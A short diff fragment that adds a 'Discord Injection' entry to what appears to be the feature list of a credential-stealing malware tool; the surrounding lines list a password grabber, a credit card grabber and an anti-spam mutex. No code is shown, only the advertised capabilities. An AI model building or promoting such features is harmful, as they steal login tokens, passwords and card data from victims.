@@ -16,6 +16,8 @@
 
 - Create Mutex (Anti Spam)
 
+- Discord Injection (Send token, password, and email on login or when password is changed)
+
 - Password Grabber
 
 - Credit Card Grabber
